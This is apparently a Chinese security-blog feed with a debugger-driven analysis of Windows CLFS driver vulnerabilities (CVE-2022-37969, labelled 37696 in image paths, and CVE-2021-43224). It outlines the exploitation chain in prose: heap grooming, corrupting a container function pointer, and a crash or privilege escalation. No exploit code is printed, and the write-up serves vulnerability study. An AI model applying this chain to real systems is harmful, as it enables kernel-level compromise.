NULL);</code></p><p>函数<code>CClfsLogFcbPhysical::Initialize</code>会进行解析</p><pre><code class="hljs apache"><span class="hljs-attribute">open</span> evil MyLog.blf<span class="hljs-attribute">0</span>: kd&gt; k <span class="hljs-comment"># Child-SP          RetAddr               Call Site</span><span class="hljs-attribute">00</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">8</span>d<span class="hljs-number">56238</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">39</span>eaeb     CLFS!CClfsLogFcbPhysical::Initialize<span class="hljs-attribute">01</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">8</span>d<span class="hljs-number">56240</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">3</span>a<span class="hljs-number">0</span>a<span class="hljs-number">2</span>b     CLFS!CClfsRequest::Create+<span class="hljs-number">0</span>x<span class="hljs-number">4</span>ef<span class="hljs-attribute">02</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">8</span>d<span class="hljs-number">56390</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">3</span>a<span class="hljs-number">07</span>f<span class="hljs-number">7</span>     CLFS!CClfsRequest::Dispatch+<span class="hljs-number">0</span>x<span class="hljs-number">97</span><span class="hljs-attribute">03</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">8</span>d<span class="hljs-number">563</span>e<span class="hljs-number">0</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">3</span>a<span class="hljs-number">0747</span>     CLFS!ClfsDispatchIoRequest+<span class="hljs-number">0</span>x<span class="hljs-number">87</span></code></pre><p>P.S 以下调用函数都是由<code>CClfsLogFcbPhysical::Initialize</code>函数直接调用的，都在<code>CClfsLogFcbPhysical::Initialize</code>函数中</p><h4 id="Signatures-数组的-Decode"><a href="#Signatures-数组的-Decode" class="headerlink" title="Signatures 数组的 Decode"></a>Signatures 数组的 Decode</h4><p>在<code>CClfsBaseFilePersisted::OpenImage</code>中，主要会把<code>SignaturesOffset</code>偏移处的<code>Signatures</code>数组的内容<code>Decode</code>写入内存对应位置</p><p>下图为<code>CClfsLogFcbPhysical::Initialize</code>中对于<code>CClfsBaseFilePersisted::OpenImage</code>的调用</p><p><img src="/img/CVE-2022-37696/OpenImageIDA.png" alt="OpenImageIDA"></p><p>在会走到<code>CClfsBaseFilePersisted::ReadMetadataBlock</code>时，会调用<code>ClfsDecodeBlock</code>实现上述<code>Decode</code>功能</p><p><img src="/img/CVE-2022-37696/ReadMetadataBlock.png" alt="ReadMetadataBlock"></p><p>进入<code>ClfsDecodeBlock</code>时的调用栈如下</p><pre><code class="hljs apache"><span class="hljs-attribute">0</span>: kd&gt; k <span class="hljs-comment"># Child-SP          RetAddr               Call Site</span><span class="hljs-attribute">00</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">40</span>f<span class="hljs-number">48</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">3</span>a<span class="hljs-number">4192</span>     CLFS!ClfsDecodeBlock<span class="hljs-attribute">01</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">40</span>f<span class="hljs-number">50</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">3</span>aa<span class="hljs-number">395</span>     CLFS!CClfsBaseFilePersisted::ReadMetadataBlock+<span class="hljs-number">0</span>x<span class="hljs-number">182</span><span class="hljs-attribute">02</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">40</span>ff<span class="hljs-number">0</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">3</span>aa<span class="hljs-number">204</span>     CLFS!CClfsBaseFile::AcquireMetadataBlock+<span class="hljs-number">0</span>x<span class="hljs-number">45</span><span class="hljs-attribute">03</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">41020</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">3</span>a<span class="hljs-number">9</span>c<span class="hljs-number">36</span>     CLFS!CClfsBaseFilePersisted::ReadImage+<span class="hljs-number">0</span>x<span class="hljs-number">1</span>e<span class="hljs-number">8</span><span class="hljs-attribute">04</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">41080</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">372</span>da<span class="hljs-number">2</span>     CLFS!CClfsBaseFilePersisted::OpenImage+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>fa<span class="hljs-attribute">05</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">41100</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">39</span>eaeb     CLFS!CClfsLogFcbPhysical::Initialize+<span class="hljs-number">0</span>x<span class="hljs-number">326</span><span class="hljs-attribute">06</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">41240</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">3</span>a<span class="hljs-number">0</span>a<span class="hljs-number">2</span>b     CLFS!CClfsRequest::Create+<span class="hljs-number">0</span>x<span class="hljs-number">4</span>ef</code></pre><p><code>ClfsDecodeBlock</code>函数会循环将<code>signArray</code>的内容取出，放入<code>base+0x200*N+0x1FE</code>的地方去，因此<code>0x0050</code>会被写入<code>13th</code>(<code>(0x68-0x50)/2+1</code>)的<code>sector</code>的<code>Signature</code>地方</p><p><img src="/img/CVE-2022-37696/ClfsDecodeBlockIDA.png" alt="ClfsDecodeBlockIDA"></p><p><img src="/img/CVE-2022-37696/ClfsDecodeBlockWindbg.png" alt="ClfsDecodeBlockWindbg"></p><p>P.S 这个<code>0x0050</code>后续会被写回来；这个 <code>signArray</code> 都是2个字节大小的</p><p>P.S. <a href="https://github.com/ionescu007/clfs-docs/">clfs-docs</a> 有对于这个每个<code>sector</code>的签名数组的详细说明，其实这里的<code>decode</code>和<code>encode</code>其实就是：当从磁盘中读<code>blf</code>时，解析该数组，以恢复这个<code>sector</code>的内存；从<code>sector</code>内存获取值，以存储到这个数组中。</p><p><code>When reading the Base Log File from disk, it is critical to parse this array, and take each 2 bytes and overlay them on top of the signature bytes of each corresponding sector (restoring the original data bytes).</code></p><h4 id="Fake-Client-Context-的解析"><a href="#Fake-Client-Context-的解析" class="headerlink" title="Fake Client Context 的解析"></a>Fake Client Context 的解析</h4><p>在<code>CClfsBaseFile::AcquireClientContext</code>中，主要会获取<code>Fake Client Context</code>，从而写到一个<code>sector</code>的</p><p>下图为<code>CClfsLogFcbPhysical::Initialize</code>中对于<code>CClfsBaseFile::AcquireClientContext</code>的调用</p><p><img src="/img/CVE-2022-37696/AcquireClientContextIDA.png" alt="AcquireClientContextIDA"></p><p>在<code>CClfsBaseFile::AcquireClientContext</code>中调用<code>CClfsBaseFile::GetSymbol</code>获取<code>1st rgClients</code>的内容</p><p><img src="/img/CVE-2022-37696/GetSymbolIDA.png" alt="GetSymbolIDA"></p><p>其中对于<code>fake client context</code>之前的内容修改，就是为了过这里的检测，可以通过查看原来的<code>real client context</code>查看这个检测，<code>0x13f0 = 0x1368+0x88 | 0x1bd8 = 0x1368+0x870</code>，因此最后的地方应该是<code>0x1b30+0x88=0x1bb8</code></p><p><img src="/img/CVE-2022-37696/RealClientContext.png" alt="RealClientContext"></p><h4 id="ResetLog-覆盖-sector-的-signature"><a href="#ResetLog-覆盖-sector-的-signature" class="headerlink" title="ResetLog 覆盖 sector 的 signature"></a>ResetLog 覆盖 sector 的 signature</h4><p>这里<code>v75</code>为<code>fake client context</code>，为了能走到<code>CClfsLogFcbPhysical::ResetLog</code>，则需要将其设置为<code>0x20</code>，且使<code>CClfsLogFcbPhysical:IsMultiplexed</code>返回<code>false</code></p><p><img src="/img/CVE-2022-37696/eStateIDA.png" alt="eStateIDA"></p><p>在这里，由于修改了<code>Fake Client Context</code>的偏移，因此最后<code>CLFS_LSN_INVALID:0xffffffff</code>恰好写入了<code>14th sector</code>的<code>signature</code>位置</p><p><img src="/img/CVE-2022-37696/ResetLogIDA.png" alt="ResetLogIDA"></p><h4 id="overwrite-Signatures-Offset"><a href="#overwrite-Signatures-Offset" class="headerlink" title="overwrite Signatures Offset"></a>overwrite Signatures Offset</h4><p>最后这个通过间接跳转走到<code>ClfsEncodeBlock</code>的地方，然后通过<code>encode</code>把<code>0x0050</code>和<code>0xffff</code>写回，最后导致<code>signaturesOffset</code>的值就被修改成了不合理的超大值</p><p><img src="/img/CVE-2022-37696/FlushMetadataIDA.png" alt="FlushMetadataIDA"></p><p>整体的调用链如下所示</p><pre><code class="hljs apache"><span class="hljs-attribute">0</span>: kd&gt; k <span class="hljs-comment"># Child-SP          RetAddr               Call Site</span><span class="hljs-attribute">00</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">40</span>fd<span class="hljs-number">8</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">3</span>a<span class="hljs-number">2232</span>     CLFS!ClfsEncodeBlock<span class="hljs-attribute">01</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">40</span>fe<span class="hljs-number">0</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">3999</span>a<span class="hljs-number">0</span>     CLFS!CClfsBaseFilePersisted::WriteMetadataBlock+<span class="hljs-number">0</span>x<span class="hljs-number">152</span><span class="hljs-attribute">02</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">41070</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">37161</span>f     CLFS!CClfsBaseFilePersisted::FlushImage+<span class="hljs-number">0</span>x<span class="hljs-number">40</span><span class="hljs-attribute">03</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">410</span>b<span class="hljs-number">0</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">373701</span>     CLFS!CClfsLogFcbPhysical::FlushMetadata+<span class="hljs-number">0</span>xef<span class="hljs-attribute">04</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">41100</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">39</span>eaeb     CLFS!CClfsLogFcbPhysical::Initialize+<span class="hljs-number">0</span>xc<span class="hljs-number">85</span><span class="hljs-attribute">05</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">41240</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">3</span>a<span class="hljs-number">0</span>a<span class="hljs-number">2</span>b     CLFS!CClfsRequest::Create+<span class="hljs-number">0</span>x<span class="hljs-number">4</span>ef<span class="hljs-attribute">06</span> ffffeb<span class="hljs-number">07</span>`b<span class="hljs-number">6</span>f<span class="hljs-number">41390</span> fffff<span class="hljs-number">807</span>`<span class="hljs-number">6</span>e<span class="hljs-number">3</span>a<span class="hljs-number">07</span>f<span class="hljs-number">7</span>     CLFS!CClfsRequest::Dispatch+<span class="hljs-number">0</span>x<span class="hljs-number">97</span></code></pre><p>最后的写回<code>signArray</code></p><p><img src="/img/CVE-2022-37696/ClfsEncodeBlockPrivateIDA.png" alt="ClfsEncodeBlockPrivateIDA"></p><p>可以看到最后被修改成了<code>0xffff0050</code></p><h4 id="畸形的-SignatureOffset-影响的整个过程总结"><a href="#畸形的-SignatureOffset-影响的整个过程总结" class="headerlink" title="畸形的 SignatureOffset 影响的整个过程总结"></a>畸形的 SignatureOffset 影响的整个过程总结</h4><p>解析<code>signArray</code>，向<code>13th sector</code>写入<code>0x0050</code>，解析<code>fake client context</code>，使得<code>14th sector</code>写入<code>0xffff</code>，最后<code>ClfsEncodeBlockPrivate</code>，写回<code>signArray</code>，从而构造了一个超大值<code>signaturesOffset</code></p><p><img src="/img/CVE-2022-37696/Vuln.png" alt="Vuln"></p><h2 id="POC-分析"><a href="#POC-分析" class="headerlink" title="POC 分析"></a>POC 分析</h2><p>重新来看这个<code>POC</code>的图</p><p><img src="/img/CVE-2022-37696/POC.png" alt="POC"></p><ol><li>初始化<code>MyLog.blf</code></li><li>堆风水布局，以使得后面的<code>MyLog</code>的堆块和<code>MyLxg_xxx</code>的堆块是连续的</li><li>构造畸形的<code>MyLog.blf</code>，解析时，仍能打开<code>HANDLE</code></li><li>构造与<code>MyLog</code>堆块连续的堆块<code>MyLxg_xxx</code></li><li>给<code>MyLxg_xxx</code>添加<code>LogContainer</code>，在这个结构体中存在一个函数指针<code>pContainer</code></li><li>获取<code>NtSetInformationFile</code>的地址</li><li>给<code>MyLog</code>添加<code>LogContainer</code>，此时已经可以溢出到<code>MyLxg_xxx</code>的<code>Container Context</code>的<code>pContainer</code></li><li>通过<code>NtSetInformationFile</code>设置<code>MyLxg_xxx</code>为<code>FileDispositionInformation</code>，即该函数将在文件关闭时删除文件或取消先前请求的删除，因此在关闭文件时，可以触发到<code>removeContainer</code>对<code>pContainer</code>的使用，从而触发<code>BSOD</code></li><li>触发漏洞</li></ol><p>在扩大这个漏洞影响时，是覆盖了<code>SignaturesOffset</code>，而在<code>CClfsBaseFilePersisted::AllocSymbol</code>时，则利用<code>SignaturesOffset</code>做的检测</p><p><img src="/img/CVE-2022-37696/AllocSymbolIDA.png" alt="AllocSymbolIDA"></p><p>因此此时，可以直接绕过这个检测，使得<code>cbSymbolZone</code>可以为一个大值，从而覆盖到下一个堆块的<code>pContainer</code></p><p><img src="/img/CVE-2022-37696/OOBW.png" alt="OOBW"></p><p>最后漏洞触发是在关闭<code>blf</code>文件时，在函数<code>CClfsBaseFilePersisted::RemoveContainer</code>中，会直接使用<code>pContainer</code>的虚表进行函数调用，而被破坏的<code>pContainer</code>会导致<code>BSOD</code>甚至<code>EOP</code></p><h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p>该漏洞的<code>patch</code>，在<code>CClfsBaseFilePersisted::LoadContainerQ</code>时，对于<code>cbSymbolZone</code>和<code>signaturesOffset</code>进行了检测</p><pre><code class="hljs apache"><span class="hljs-attribute">1</span>: kd&gt; k <span class="hljs-comment"># Child-SP          RetAddr               Call Site</span><span class="hljs-attribute">00</span> ffff<span class="hljs-number">810</span>c`a<span class="hljs-number">0</span>c<span class="hljs-number">44</span>fa<span class="hljs-number">0</span> fffff<span class="hljs-number">805</span>`<span class="hljs-number">373</span>b<span class="hljs-number">2176</span>     CLFS!CClfsBaseFilePersisted::LoadContainerQ+<span class="hljs-number">0</span>x<span class="hljs-number">1</span>b<span class="hljs-number">2</span><span class="hljs-attribute">01</span> ffff<span class="hljs-number">810</span>c`a<span class="hljs-number">0</span>c<span class="hljs-number">45100</span> fffff<span class="hljs-number">805</span>`<span class="hljs-number">373</span>df<span class="hljs-number">093</span>     CLFS!CClfsLogFcbPhysical::Initialize+<span class="hljs-number">0</span>x<span class="hljs-number">6</span>da<span class="hljs-attribute">02</span> ffff<span class="hljs-number">810</span>c`a<span class="hljs-number">0</span>c<span class="hljs-number">45240</span> fffff<span class="hljs-number">805</span>`<span class="hljs-number">373</span>e<span class="hljs-number">0</span>aeb     CLFS!CClfsRequest::Create+<span class="hljs-number">0</span>x<span class="hljs-number">4</span>ef</code></pre><p><img src="/img/CVE-2022-37696/patch.png" alt="patch"></p><p><code>CClfsBaseFilePersisted::LoadContainerQ</code>函数在<code>CClfsLogFcbPhysical::Initialize</code>函数中，位于<code>ResetLog</code>之后，<code>ClfsEncodeBlock</code>之前</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该漏洞利用不正确的<code>SignaturesOffset</code>，仅仅能写<code>0xffffffff</code>的利用，扩大到再次修改<code>SignaturesOffset</code>，从而直接导致溢出</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part">https://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part</a><br><a href="https://github.com/ionescu007/clfs-docs/blob/main/README.md">https://github.com/ionescu007/clfs-docs/blob/main/README.md</a><br><a href="https://www.slideshare.net/PeterHlavaty/deathnote-of-microsoft-windows-kernel">https://www.slideshare.net/PeterHlavaty/deathnote-of-microsoft-windows-kernel</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows kernel</tag>
      
      <tag>clfs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021-43224 漏洞复现</title>
    <link href="/2022/09/13/CVE-2021-43224%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/09/13/CVE-2021-43224%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><pre><code class="hljs angelscript">虚拟机：Win10 <span class="hljs-number">1903</span> <span class="hljs-number">18362.30</span>物理机：Win10debugger：windbg previewcompiler：vs2022</code></pre><p>环境我就直接使用的，<code>Win10 1903</code></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我调试漏洞的时候，用了三个<code>clfs.sys</code>：<code>Win10 1903</code>上的<code>2019.03.19</code>的<code>clfs.sys</code>，和两个<code>MSRC</code>上下载的<code>win8.1</code>的<code>patch</code>前后的<code>2021.09.18</code>、<code>2021.11.16</code>的<code>clfs.sys</code>（其中<code>win8.1</code>的<code>clfs.sys</code>并不能获取其<code>pdb</code>）</p><p>我在调试该漏洞时，直接使用了该<a href="https://github.com/KaLendsi/CVE-2021-43224-POC">POC</a>，先跑了一次，发现其<code>crash</code>的地方为<code>CClfsLogFcbVirtual::QueryLogFileInfo</code>，在该处下断点，发现当出现下述的调用链时，会发生<code>crash</code>，或者说在<code>POC</code>的最后一次<code>system(&quot;pause&quot;)</code>之后的<code>CClfsLogFcbVirtual::QueryLogFileInfo</code>就会<code>crash</code></p><pre><code class="hljs apache"><span class="hljs-attribute">0</span>: kd&gt; kb <span class="hljs-comment"># RetAddr               : Args to Child                                                           : Call Site</span><span class="hljs-attribute">00</span> fffff<span class="hljs-number">804</span>`<span class="hljs-number">2</span>b<span class="hljs-number">3817</span>fd     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000002</span> ffffbb<span class="hljs-number">84</span>`d<span class="hljs-number">1</span>efbe<span class="hljs-number">00</span> ffffbb<span class="hljs-number">84</span>`d<span class="hljs-number">04</span>ed<span class="hljs-number">480</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> : CLFS!CClfsLogFcbVirtual::QueryLogFileInfo<span class="hljs-attribute">01</span> fffff<span class="hljs-number">804</span>`<span class="hljs-number">2</span>b<span class="hljs-number">36508</span>b     : ffffbb<span class="hljs-number">84</span>`d<span class="hljs-number">04</span>ed<span class="hljs-number">480</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000110</span> ffffbb<span class="hljs-number">84</span>`d<span class="hljs-number">3</span>a<span class="hljs-number">33</span>d<span class="hljs-number">30</span> ffffbb<span class="hljs-number">84</span>`ce<span class="hljs-number">0</span>a<span class="hljs-number">0600</span> : CLFS!CClfsRequest::LogFileInfo+<span class="hljs-number">0</span>x<span class="hljs-number">149</span><span class="hljs-attribute">02</span> fffff<span class="hljs-number">804</span>`<span class="hljs-number">2</span>b<span class="hljs-number">364</span>e<span class="hljs-number">37</span>     : ffffbb<span class="hljs-number">84</span>`d<span class="hljs-number">04</span>ed<span class="hljs-number">480</span> <span class="hljs-number">00007</span>ffd`<span class="hljs-number">60</span>c<span class="hljs-number">43380</span> ffffbb<span class="hljs-number">84</span>`ceb<span class="hljs-number">07</span>d<span class="hljs-number">80</span> ffff<span class="hljs-number">9480</span>`<span class="hljs-number">00293</span>b<span class="hljs-number">42</span> : CLFS!CClfsRequest::Dispatch+<span class="hljs-number">0</span>xb<span class="hljs-number">7</span><span class="hljs-attribute">03</span> fffff<span class="hljs-number">804</span>`<span class="hljs-number">2</span>b<span class="hljs-number">364</span>d<span class="hljs-number">87</span>     : ffffbb<span class="hljs-number">84</span>`d<span class="hljs-number">1</span>efbe<span class="hljs-number">00</span> ffffbb<span class="hljs-number">84</span>`d<span class="hljs-number">1</span>efbe<span class="hljs-number">00</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> : CLFS!ClfsDispatchIoRequest+<span class="hljs-number">0</span>x<span class="hljs-number">87</span><span class="hljs-attribute">04</span> fffff<span class="hljs-number">804</span>`<span class="hljs-number">2</span>a<span class="hljs-number">4</span>ddda<span class="hljs-number">9</span>     : ffffbb<span class="hljs-number">84</span>`d<span class="hljs-number">1</span>efbe<span class="hljs-number">00</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">0000020</span>c : CLFS!CClfsDriver::LogIoDispatch+<span class="hljs-number">0</span>x<span class="hljs-number">27</span><span class="hljs-attribute">05</span> fffff<span class="hljs-number">804</span>`<span class="hljs-number">2</span>aacbdd<span class="hljs-number">5</span>     : ffffcf<span class="hljs-number">04</span>`d<span class="hljs-number">196</span>bb<span class="hljs-number">80</span> ffffbb<span class="hljs-number">84</span>`d<span class="hljs-number">1</span>efbe<span class="hljs-number">00</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> ffffbb<span class="hljs-number">84</span>`d<span class="hljs-number">3</span>a<span class="hljs-number">33</span>d<span class="hljs-number">30</span> : nt!IofCallDriver+<span class="hljs-number">0</span>x<span class="hljs-number">59</span><span class="hljs-attribute">06</span> fffff<span class="hljs-number">804</span>`<span class="hljs-number">2</span>aacb<span class="hljs-number">72</span>a     : ffffbb<span class="hljs-number">84</span>`d<span class="hljs-number">1</span>efbe<span class="hljs-number">00</span> ffffcf<span class="hljs-number">04</span>`d<span class="hljs-number">196</span>bb<span class="hljs-number">80</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">80076818</span> ffffcf<span class="hljs-number">04</span>`d<span class="hljs-number">196</span>bb<span class="hljs-number">80</span> : nt!IopSynchronousServiceTail+<span class="hljs-number">0</span>x<span class="hljs-number">1</span>a<span class="hljs-number">5</span><span class="hljs-attribute">07</span> fffff<span class="hljs-number">804</span>`<span class="hljs-number">2</span>aacb<span class="hljs-number">146</span>     : <span class="hljs-number">00007</span>ffd`<span class="hljs-number">60</span>c<span class="hljs-number">43380</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> : nt!IopXxxControlFile+<span class="hljs-number">0</span>x<span class="hljs-number">5</span>ca<span class="hljs-attribute">08</span> fffff<span class="hljs-number">804</span>`<span class="hljs-number">2</span>a<span class="hljs-number">683</span>e<span class="hljs-number">95</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> : nt!NtDeviceIoControlFile+<span class="hljs-number">0</span>x<span class="hljs-number">56</span><span class="hljs-attribute">09</span> <span class="hljs-number">00007</span>ffd`<span class="hljs-number">6765</span>c<span class="hljs-number">144</span>     : <span class="hljs-number">00007</span>ffd`<span class="hljs-number">653</span>f<span class="hljs-number">57</span>b<span class="hljs-number">7</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000100</span> <span class="hljs-number">00000197</span>`<span class="hljs-number">00000001</span> : nt!KiSystemServiceCopyEnd+<span class="hljs-number">0</span>x<span class="hljs-number">25</span><span class="hljs-attribute">0a</span> <span class="hljs-number">00007</span>ffd`<span class="hljs-number">653</span>f<span class="hljs-number">57</span>b<span class="hljs-number">7</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000100</span> <span class="hljs-number">00000197</span>`<span class="hljs-number">00000001</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000003</span> : ntdll!NtDeviceIoControlFile+<span class="hljs-number">0</span>x<span class="hljs-number">14</span><span class="hljs-attribute">0b</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000100</span> <span class="hljs-number">00000197</span>`<span class="hljs-number">00000001</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000003</span> <span class="hljs-number">00000093</span>`bdcff<span class="hljs-number">9</span>a<span class="hljs-number">0</span> : <span class="hljs-number">0</span>x<span class="hljs-number">00007</span>ffd`<span class="hljs-number">653</span>f<span class="hljs-number">57</span>b<span class="hljs-number">7</span></code></pre><p>其漏洞原因也很简单，如下图所示，其漏洞为，在间接调用时，调用<code>CClfsLogFcbPhysical::QueryLogFileInfo</code>时，会对于该参数进行<code>memset(src, 0, *a7)</code>的操作，而<code>*a7</code>就是我们输入<code>size</code>大小，而<code>src</code>的大小为<code>0x78</code>，因此就会造成越界写零</p><p><img src="/img/CVE-2021-43224/CClfsLogFcbVirtual.png" alt="CClfsLogFcbVirtual::QueryLogFileInfo"></p><p><img src="/img/CVE-2021-43224/CClfsLogFcbPhysical.png" alt="CClfsLogFcbPhysical::QueryLogFileInfo"></p><p>调用<code>CClfsLogFcbPhysical::QueryLogFileInfo</code>之前的<code>CClfsLogFcbVirtual::QueryLogFileInfo</code>的栈帧如下</p><pre><code class="hljs dns">    CLFS!CClfsLogFcbVirtual<span class="hljs-number">::</span>QueryLogFileInfo:fffff8<span class="hljs-number">07`05759070</span> <span class="hljs-number">4053</span>             push    rbxfffff8<span class="hljs-number">07`05759072</span> <span class="hljs-number">56</span>               push    rsifffff8<span class="hljs-number">07`05759073</span> <span class="hljs-number">57</span>               push    rdifffff8<span class="hljs-number">07`05759074</span> <span class="hljs-number">4154</span>             push    r12fffff8<span class="hljs-number">07`05759076</span> <span class="hljs-number">4155</span>             push    r13fffff8<span class="hljs-number">07`05759078</span> <span class="hljs-number">4156</span>             push    r14fffff807`<span class="hljs-number">0575907</span>a <span class="hljs-number">4157</span>             push    r15fffff807`<span class="hljs-number">0575907</span>c <span class="hljs-number">4881</span>ecf<span class="hljs-number">0000000</span>   sub     rsp, <span class="hljs-number">0</span>F0hfffff8<span class="hljs-number">07`05759083</span> <span class="hljs-number">488</span>b05a63fffff   mov     rax, qword ptr [CLFS!__security_cookie (fffff80<span class="hljs-number">70574d030</span>)]fffff807`<span class="hljs-number">0575908</span>a <span class="hljs-number">4833</span>c4           xor     rax, rspfffff807`<span class="hljs-number">0575908d</span> <span class="hljs-number">48898424</span>e<span class="hljs-number">0000000</span> mov     qword ptr [rsp+<span class="hljs-number">0</span>E0h], rax<span class="hljs-number">1</span>: kd&gt; dq rsp rsp+<span class="hljs-number">0</span>x128fffff986`f<span class="hljs-number">0d95570</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>fffff986`f<span class="hljs-number">0d95580</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>fffff986`f<span class="hljs-number">0d95590</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>fffff986`f<span class="hljs-number">0d955a0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>fffff986`f<span class="hljs-number">0d955b0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>fffff986`f<span class="hljs-number">0d955c0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>fffff986`f<span class="hljs-number">0d955d0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>fffff986`f<span class="hljs-number">0d955e0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>fffff986`f<span class="hljs-number">0d955f0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>fffff986`f<span class="hljs-number">0d95600</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> fffff807`<span class="hljs-number">048e3b07</span>fffff986`f<span class="hljs-number">0d95610</span>  ffff8687`<span class="hljs-number">0795</span>ba<span class="hljs-number">58 00000000</span>`<span class="hljs-number">00000000</span>fffff986`f<span class="hljs-number">0d95620</span>  <span class="hljs-number">00000000</span>`<span 